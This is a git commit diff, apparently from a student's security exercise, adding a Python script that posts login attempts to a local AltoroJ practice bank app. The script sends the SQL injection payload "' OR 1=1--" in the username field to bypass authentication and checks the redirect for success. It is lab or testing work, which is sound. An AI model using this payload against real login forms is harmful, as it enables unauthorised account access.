0e6c367b21ee5075b70aa8f8d43b5429587b10f3
seba <seba.mart0923@gmail.com>
2024-10-16 23:38:51 -0300

    diferentes sol

--- Script_ Inyección_SQL.py
+++ Script_ Inyección_SQL.py
@@ -1,3 +1,5 @@
+"""
+
 import requests
 
 import sys
@@ -32,3 +34,162 @@ except requests.exceptions.RequestException as e:
 
     print(f"Error al conectar con la API: {e}")
     sys.exit(0)
+
+
+"""
+
+"""
+
+import requests
+
+
+
+# URL del login
+
+url = "http://localhost:8080/AltoroJ/doLogin"
+
+
+
+# Datos del login en el formato adecuado
+
+params = {
+    "uid": "' OR 1=1--", 
+    "passw": "hola", 
+    "btnSubmit": "Login"
+}
+
+
+
+# Realizar la solicitud POST sin seguir redirecciones
+
+try:
+
+    response = requests.post(url, data=params, allow_redirects=False)  # Evitar redirecciones automáticas
+
+    
+
+    # Verificar si el código de respuesta es una redirección (3xx)
+
+    if response.status_code in [301, 302, 303, 307, 308]:
+
+        # Acceder a la cabecera Location
+
+        location = response.headers.get('Location')
+
+        if location:
+
+            print(f"Redirigido a: {location}")
+
+        else:
+
+            print("No se encontró la cabecera 'Location'.")
+
+    else:
+
+        print(f"Respuesta recibida con código: {response.status_code}")
+
+
+
+except requests.exceptions.RequestException as e:
+
+    print(f"Error en la conexión: {e}")
+
+"""
+
+
+import requests
+
+import sys
+
+# URL del login
+
+url = "http://localhost:8080/AltoroJ/doLogin"
+
+
+
+
+
+# Datos del login en el formato adecuado
+
+paramsattack = {
+
+    "uid": "' OR 1=1--", 
+
+    "passw": "hola", 
+
+    "btnSubmit": "Login"
+
+}
+
+
+
+paramsOk= {
+
+	"uid": "admin",
+
+	"passw": "admin",
+
+	"btnSubmit": "Login"
+
+}
+
+
+
+paramsMalo={
+
+	"uid": "adm",
+
+	"passw": "hola",
+
+	"btnSubmit": "Login"
+
+}
+
+
+
+
+
+def Login(params):
+
+    # Realizar la solicitud POST sin seguir redirecciones
+
+    try:
+
+        response = requests.post(url, data=params, allow_redirects=False)  
+
+        
+
+        if response.status_code == 302:
+
+            location = response.headers.get('Location')
+
+            if location == "/AltoroJ/bank/main.jsp":
+
+                print(f"1, Redirigido a: {location}")
+
+                print(sys.exit(1))
+
+            else:
+
+                print(f" 0, {location}")
+
+                sys.exit(0)
+
+        else:
+
+            print(f"Respuesta recibida con código: {response.status_code}")
+
+
+
+    except requests.exceptions.RequestException as e:
+
+        print(f"Error en la conexión: {e}")
+
+
+
+# Llamar a la función Attack con los parámetros definidos
+
+
+
+Login(paramsMalo)
+
